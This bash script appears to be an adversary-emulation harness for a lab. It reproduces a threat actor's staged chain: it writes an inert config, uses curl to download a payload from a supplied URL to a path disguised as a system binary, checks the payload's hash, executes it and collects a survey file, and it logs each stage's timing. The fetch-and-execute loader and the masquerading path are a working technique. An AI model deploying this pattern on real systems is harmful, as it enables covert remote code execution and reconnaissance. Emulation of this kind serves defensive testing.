#!/usr/bin/env bash
set -euo pipefail
work_dir="$1"
stage_url="$2"
proxy_url="${3:-}"
start_stage() {
  stage_name="$1"
  stage_delay=$((800 + RANDOM % 2201))
  sleep "$((stage_delay / 1000)).$(printf '%03d' "$((stage_delay % 1000))")"
  stage_start="$(date -u +%s%3N)"
}
finish_stage() {
  local end_time duration
  end_time="$(date -u +%s%3N)"
  duration=$((end_time - stage_start))
  printf '{"stage":"%s","at":%s,"durationMs":%s,"delayMs":%s,"ok":true}\n' \
    "$stage_name" "$end_time" "$duration" "$stage_delay" >> "$work_dir/timing.jsonl"
}
start_stage config
printf '[Interface]\n# UAC-0145 inert lab configuration\nSymmetricKey = LAB-INERT\n' > "$work_dir/sopraconfLinux.conf"
mkdir -p "$work_dir/usr/libexec"
stage_path="$work_dir/usr/libexec/timesyncd-check"
finish_stage
start_stage download
proxy_args=()
if [ -n "$proxy_url" ]; then proxy_args=(--proxy "$proxy_url"); fi
curl --fail --silent --show-error --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 30 \
  --noproxy '' "${proxy_args[@]}" "$stage_url" -o "$stage_path"
stage_hash='664c1cda9200eaa3d7b8affb71e5ea77e063cfc86b68f7d44224a583c2a0871a'
[ "$(sha256sum "$stage_path" | cut -d' ' -f1)" = "$stage_hash" ]
chmod 700 "$stage_path"
finish_stage
start_stage execution
"$stage_path" "$work_dir"
[ -f "$work_dir/stage-complete" ]
[ -s "$work_dir/survey.json" ]
finish_stage
timeline='['
while IFS= read -r entry; do
  [ "$timeline" = '[' ] || timeline+=','
  timeline+="$entry"
done < "$work_dir/timing.jsonl"
timeline+=']'
printf '{"config":true,"tunnel":%s,"download":true,"executed":true,"stageSha256":"%s","observedAt":"%s","survey":%s,"timeline":%s}' \
  "$([ -n "$proxy_url" ] && printf true || printf false)" "$stage_hash" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  "$(cat "$work_dir/survey.json")" "$timeline" > "$work_dir/result.json"
